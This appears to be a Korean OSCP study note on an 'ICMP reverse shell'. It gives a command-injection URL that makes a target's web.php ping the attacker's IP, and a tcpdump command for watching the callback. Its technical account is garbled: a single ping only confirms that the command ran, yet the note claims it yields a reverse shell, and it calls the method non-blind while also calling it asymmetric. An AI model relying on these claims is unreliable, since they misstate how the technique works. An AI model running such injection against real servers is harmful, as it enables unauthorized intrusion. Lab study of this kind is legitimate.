# icmp reverse shell

## 개요

ICMP에 기반한 비대칭(non-blind) 방식의 리버스 쉘. 방화벽이 TCP 4444를 막아도 동작할 수 있다. 하지만 트래픽 관찰이 필요하므로, OSCP 시험에서는 비추천이나 익히면 재미있는 기법이다.

## 실행 (공격자)

```bash
# 트래픽 관찰: ICMP echo 요청만 관찰
sudo tcpdump -i tun0 icmp
```

## 실행 (대상)

```bash
http://타겟IP/files/ftp/web.php?cmd=ping -c 1 공격자IP
```

## 각 단계의 의미

| 단계 | 설명 |
|------|------|
| `web.php?cmd=...` | 대상 서버의 명령 실행 취약점 |
| `ping -c 1 공격자IP` | 공격자 IP로 ICMP 패킷 전송 |
| `tcpdump -i tun0 icmp` | 공격자 측에서 ICMP 트래픽 관찰 |

- `web.php` 쪽 코드는 `exec("ping ...")`를 수행해야 한다.
- 공격자 IP에 도달하면 리버스 쉘로 연결된다.

## 주의

- ICMP 트래픽은 대부분 IDS/방화벽에 의해 차단된다.
- 이 공격은 보조 수단으로만 익힌다. TCP 리버스 쉘(reverse_shell.md)이 기본 경로다.
- 대상 쪽 php 스크립트는 본인 소유 환경에서 테스트한다.

## 참고 / 증적
- 발견한 내용과 증거는 노트(05-progress-tracker.md)에 함께 기록한다.
- 해당 도구의 공식 문서는 --help를 참조하여 추가 옵션을 확인한다.
- 테스트 결과를 스크린샷으로 남겨 증적 자료로 활용한다.
- 유사한 취약점이 다른 머신에도 있는지 확인한다.
